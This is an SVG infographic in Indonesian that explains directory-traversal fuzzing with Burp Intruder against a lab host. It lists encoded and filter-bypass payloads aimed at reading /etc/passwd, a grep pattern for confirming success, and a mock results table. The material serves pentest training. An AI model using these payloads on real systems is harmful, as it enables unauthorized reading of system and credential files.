<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Gradients -->
    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <linearGradient id="intruderGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#3B0764"/>
      <stop offset="100%" stop-color="#1E1B4B"/>
    </linearGradient>

    <!-- Glow Filters -->
    <filter id="glowPurple" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowGreen" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>

    <!-- Shadow -->
    <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Arrow Markers -->
    <marker id="arrowPurple" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#A855F7"/>
    </marker>
    <marker id="arrowCyan" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
    </marker>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; fill: #CBD5E1; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10.5px; font-weight: 700; }
  </style>

  <!-- Background Base -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Grid Pattern -->
  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
    <line x1="0" y1="80" x2="1080" y2="80"/>
    <line x1="0" y1="160" x2="1080" y2="160"/>
    <line x1="0" y1="240" x2="1080" y2="240"/>
    <line x1="0" y1="320" x2="1080" y2="320"/>
    <line x1="0" y1="400" x2="1080" y2="400"/>
    <line x1="0" y1="480" x2="1080" y2="480"/>
    <line x1="180" y1="0" x2="180" y2="560"/>
    <line x1="360" y1="0" x2="360" y2="560"/>
    <line x1="540" y1="0" x2="540" y2="560"/>
    <line x1="720" y1="0" x2="720" y2="560"/>
    <line x1="900" y1="0" x2="900" y2="560"/>
  </g>

  <!-- Header Section -->
  <g transform="translate(48, 40)">
    <rect x="0" y="0" width="165" height="24" rx="12" fill="#A855F7" fill-opacity="0.15" stroke="#A855F7" stroke-width="1"/>
    <text x="82" y="16" text-anchor="middle" class="badge" fill="#C084FC">AUTOMATED FUZZING</text>
    <text x="180" y="18" class="title" font-size="20">Directory Traversal: Extreme Filtering dengan Burp Intruder</text>
    <text x="0" y="42" class="subtitle" font-size="13">Otomatisasi pengujian ratusan kombinasi payload mutasi untuk menembus filter WAF berlapis</text>
  </g>

  <!-- ==================== COLUMN 1: INTRUDER POSITION SETUP ==================== -->
  <g transform="translate(48, 115)" filter="url(#cardShadow)">
    <rect width="310" height="405" rx="14" fill="url(#cardGrad)" stroke="#A855F7" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#581C87" stroke="#A855F7" stroke-width="1.5"/>
    <path d="M38 28 V48 M28 38 H48" stroke="#E9D5FF" stroke-width="2" stroke-linecap="round"/>
    <circle cx="38" cy="38" r="6" fill="none" stroke="#E9D5FF" stroke-width="2"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#E9D5FF">1. Target Position Setup</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#C084FC">Konfigurasi Sniper Marker (§)</text>

    <line x1="18" y1="68" x2="292" y2="68" stroke="#4C1D95" stroke-width="1"/>

    <!-- HTTP Request Box -->
    <rect x="16" y="80" width="278" height="115" rx="8" fill="#090D16" stroke="#4C1D95" stroke-width="1"/>
    <text x="26" y="98" class="badge" fill="#C084FC">BURP INTRUDER POSITIONS:</text>
    <text x="26" y="120" class="code-text" fill="#CBD5E1">GET /image?filename=<tspan fill="#F43F5E">§</tspan><tspan fill="#FDE047" font-weight="700">test.png</tspan><tspan fill="#F43F5E">§</tspan> HTTP/1.1</text>
    <text x="26" y="138" class="code-text" fill="#94A3B8">Host: target-lab.com</text>
    <text x="26" y="156" class="code-text" fill="#94A3B8">Cookie: session=xyz...</text>
    <text x="26" y="180" class="desc-text" font-size="10.5" fill="#A855F7">Attack Type: <tspan font-weight="700" fill="#F8FAFC">Sniper</tspan></text>

    <!-- Wordlist Category Box -->
    <rect x="16" y="208" width="278" height="182" rx="8" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
    <text x="26" y="228" class="badge" fill="#E9D5FF">SECLISTS TRAVERSAL WORDLIST:</text>
    
    <rect x="24" y="240" width="262" height="22" rx="4" fill="#1E1B4B" stroke="#6D28D9" stroke-width="1"/>
    <text x="32" y="255" class="code-text" font-size="10" fill="#C084FC">1. ../../../../etc/passwd</text>

    <rect x="24" y="268" width="262" height="22" rx="4" fill="#1E1B4B" stroke="#6D28D9" stroke-width="1"/>
    <text x="32" y="283" class="code-text" font-size="10" fill="#C084FC">2. ..%252f..%252fetc/passwd</text>

    <rect x="24" y="296" width="262" height="22" rx="4" fill="#1E1B4B" stroke="#6D28D9" stroke-width="1"/>
    <text x="32" y="311" class="code-text" font-size="10" fill="#C084FC">3. ....//....//etc/passwd%00.png</text>

    <rect x="24" y="324" width="262" height="22" rx="4" fill="#1E1B4B" stroke="#6D28D9" stroke-width="1"/>
    <text x="32" y="339" class="code-text" font-size="10" fill="#C084FC">4. %c0%af%c0%af/etc/passwd</text>

    <text x="26" y="372" class="desc-text" font-size="11" fill="#94A3B8">Total Kombinasi: <tspan font-weight="700" fill="#F8FAFC">200 - 1,000+ Payloads</tspan></text>
  </g>

  <!-- ==================== COLUMN 2: PAYLOAD MUTATION MATRIX ==================== -->
  <g transform="translate(385, 115)" filter="url(#cardShadow)">
    <rect width="320" height="405" rx="14" fill="url(#intruderGrad)" stroke="#A855F7" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#6B21A8" stroke="#D8B4FE" stroke-width="1.5"/>
    <path d="M28 44 L38 28 L48 44 Z" fill="none" stroke="#F3E8FF" stroke-width="2"/>
    <path d="M38 34 V40" stroke="#F3E8FF" stroke-width="2" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#F3E8FF">2. Payload Mutation Matrix</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#D8B4FE">Varian Kombinasi Kompleks</text>

    <line x1="18" y1="68" x2="302" y2="68" stroke="#6B21A8" stroke-width="1"/>

    <!-- Matrix Categories -->
    <g transform="translate(16, 78)">
      <!-- Item 1 -->
      <rect width="288" height="50" rx="6" fill="#0F172A" stroke="#7C3AED" stroke-width="1"/>
      <text x="12" y="18" class="badge" fill="#C084FC">1. MULTI-LAYER URL ENCODING</text>
      <text x="12" y="38" class="code-text" font-size="10.5" fill="#CBD5E1">%252e%252e%252f  |  %25252e%25252e%25252f</text>

      <!-- Item 2 -->
      <rect y="58" width="288" height="50" rx="6" fill="#0F172A" stroke="#7C3AED" stroke-width="1"/>
      <text x="12" y="76" class="badge" fill="#C084FC">2. 16-BIT UNICODE &amp; OVERLONG UTF-8</text>
      <text x="12" y="96" class="code-text" font-size="10.5" fill="#CBD5E1">%u002e%u002e%u002f  |  %c0%ae%c0%ae%c0%af</text>

      <!-- Item 3 -->
      <rect y="116" width="288" height="50" rx="6" fill="#0F172A" stroke="#7C3AED" stroke-width="1"/>
      <text x="12" y="134" class="badge" fill="#C084FC">3. MIXED SEPARATORS &amp; NTFS STREAMS</text>
      <text x="12" y="154" class="code-text" font-size="10.5" fill="#CBD5E1">..\..\etc\passwd  |  ::$DATA  |  .../</text>

      <!-- Item 4 -->
      <rect y="174" width="288" height="60" rx="6" fill="#0F172A" stroke="#7C3AED" stroke-width="1"/>
      <text x="12" y="192" class="badge" fill="#F43F5E">4. HYBRID COMBO (EXTREME BYPASS)</text>
      <text x="12" y="212" class="code-text" font-size="10" fill="#FDE047">/var/images/....//....//%252e%252e/etc/passwd%00.png</text>
      <text x="12" y="226" class="desc-text" font-size="9.5" fill="#94A3B8">(Prefix + Nested + Double Encode + Null Byte)</text>

      <!-- Options Alert -->
      <rect y="242" width="288" height="55" rx="6" fill="#2E1065" stroke="#A855F7" stroke-width="1"/>
      <text x="12" y="260" class="badge" fill="#E9D5FF">⚠️ BURP INTRUDER OPTION PENTING:</text>
      <text x="12" y="278" class="desc-text" font-size="10.5" fill="#CBD5E1">Matikan [ ] <tspan fill="#FDE047" font-weight="700">"URL-encode these characters"</tspan></text>
      <text x="12" y="292" class="desc-text" font-size="10" fill="#94A3B8">agar payload yang sudah ter-encode tidak rusak.</text>
    </g>
  </g>

  <!-- ==================== COLUMN 3: INTRUDER RESULTS & GREP ==================== -->
  <g transform="translate(730, 115)" filter="url(#cardShadow)">
    <rect width="302" height="405" rx="14" fill="url(#cardGrad)" stroke="#10B981" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#064E3B" stroke="#34D399" stroke-width="1.5"/>
    <path d="M28 38 L36 44 L48 30" stroke="#34D399" stroke-width="2" fill="none" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#A7F3D0">3. Result Inspection</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#6EE7B7">Grep Match &amp; Sorting</text>

    <line x1="18" y1="68" x2="284" y2="68" stroke="#047857" stroke-width="1"/>

    <!-- Grep Config Box -->
    <rect x="14" y="80" width="274" height="70" rx="8" fill="#090D16" stroke="#047857" stroke-width="1"/>
    <text x="24" y="98" class="badge" fill="#34D399">GREP - MATCH CONFIGURATION:</text>
    <text x="24" y="120" class="code-text" fill="#CBD5E1">Filter Pattern: <tspan fill="#FDE047">"root:x:0:0:"</tspan></text>
    <text x="24" y="136" class="desc-text" font-size="10.5" fill="#94A3B8">Centang kolom Match pada hasil attack</text>

    <!-- Attack Table Simulation -->
    <rect x="14" y="160" width="274" height="150" rx="8" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
    <text x="24" y="180" class="badge" fill="#CBD5E1">TABEL HASIL INTRUDER:</text>
    
    <!-- Table Header -->
    <text x="24" y="200" class="code-text" font-size="9.5" fill="#94A3B8">Req #  Status  Length  Grep-Match</text>
    <line x1="24" y1="206" x2="276" y2="206" stroke="#334155" stroke-width="1"/>

    <!-- Row 1 (Failed) -->
    <text x="24" y="222" class="code-text" font-size="9.5" fill="#94A3B8">001    400     280     [ ]</text>
    <!-- Row 2 (Failed) -->
    <text x="24" y="238" class="code-text" font-size="9.5" fill="#94A3B8">002    404     312     [ ]</text>
    
    <!-- Row 3 (WINNER) -->
    <rect x="20" y="246" width="262" height="20" rx="4" fill="#064E3B" stroke="#10B981" stroke-width="1" filter="url(#glowGreen)"/>
    <text x="24" y="260" class="code-text" font-size="9.5" font-weight="800" fill="#ECFDF5">073    200     1,345   [✓] root:x</text>

    <!-- Row 4 (Failed) -->
    <text x="24" y="280" class="code-text" font-size="9.5" fill="#94A3B8">074    400     280     [ ]</text>
    <text x="24" y="296" class="code-text" font-size="9.5" fill="#94A3B8">075    403     295     [ ]</text>

    <!-- Winner Summary -->
    <rect x="14" y="320" width="274" height="70" rx="8" fill="#064E3B" fill-opacity="0.3" stroke="#10B981" stroke-width="1"/>
    <text x="24" y="340" class="badge" fill="#34D399">✓ BYPASS TERKONFIRMASI:</text>
    <text x="24" y="358" class="desc-text" font-size="11">Payload #73 berhasil menembus filter</text>
    <text x="24" y="374" class="desc-text" font-size="11">dan mengekstrak berkas /etc/passwd!</text>
  </g>

  <!-- Connectors -->
  <path d="M 358 250 L 385 250" fill="none" stroke="#A855F7" stroke-width="2.5" stroke-dasharray="4,4" marker-end="url(#arrowPurple)"/>
  <path d="M 705 250 L 730 250" fill="none" stroke="#38BDF8" stroke-width="2.5" stroke-dasharray="4,4" marker-end="url(#arrowCyan)"/>

</svg>
